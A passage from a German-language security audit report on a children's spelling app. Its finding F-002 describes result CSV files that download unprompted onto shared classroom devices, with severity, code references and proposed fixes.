- **Erfolgskriterium:** Regressionstest „Hilfe → richtig“ ergibt nie einen längeren Abstand als „falsch → richtig“. Beide Wege ergeben höchstens Box 1, fällig in 1 Tag.
- **Quelle:** `agent-f-redteam.md`

### F-002 – Ergebnis-CSV wird beim Beenden des Live-Raums ungefragt heruntergeladen

- **Bereich:** Lehrer-Live-Raum, Daten auf geteilten Geräten
- **Schwere:** P3 — P3 heute. P2, sobald die Empfehlung aus E-003 (Namen und Fehlerwörter je Kind im CSV) umgesetzt wird.
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** neu (F, Codeanalyse); P3 heute, P2 sobald Namen oder Fehlerwörter je Kind in die CSV kommen.
- **Beschreibung:** Jede beendete Runde legt ohne Rückfrage eine Ergebnisdatei im Download-Ordner ab. Laut Pilotszenario läuft der Lehrerbereich am Tafelrechner (`docs/cloud-sync.md:197`), also auf einem Gerät, das Kinder bedienen. Inhalt heute: Tiernamen, Fortschritt, Fehlerzahlen, Spicker, Sterne und die häufigsten Fehlerwörter. Die Zellen sind nicht gegen Formeln abgesichert (B-007).
- **Belege:** `app/lehrer/live/hooks/use-live-room-session.ts:440-445` (`endRoom` ruft `exportCsv()`, sobald `students.length > 0`), `:459-474` (`exportCsv`: Datei `laufdiktat-ergebnisse-<Datum>.csv` per `link.click()`); Codelesung der genannten Zeilen. Kein Browserlauf (Live-Raum ohne Supabase nicht startbar).
- **Betroffene:** Lehrkräfte an geteilten Tafel- und Koffergeräten; Kinder, deren pseudonyme Ergebnisse sich dort sammeln
- **Folgen:** - Ergebnisdateien sammeln sich unbemerkt auf geteilten Geräten. - Mit E-003 (Namen) würden daraus personenbezogene Leistungsdaten im öffentlichen Download-Ordner. - Zusammen mit B-007 öffnet die Lehrkraft eine Datei mit fremdgesteuertem Inhalt in einem Tabellenprogramm.
- **Empfehlung (Vorschlag zur Prüfung):** - Export nur auf ausdrücklichen Klick, mit Hinweis „Datei liegt danach im Download-Ordner dieses Geräts“. - Formeln neutralisieren (B-007). - E-003 erst danach umsetzen.
- **Aufwand:** S
- **Erfolgskriterium:** Test: „Raum beenden“ erzeugt ohne Klick keinen Download.
- **Quelle:** `agent-f-redteam.md`
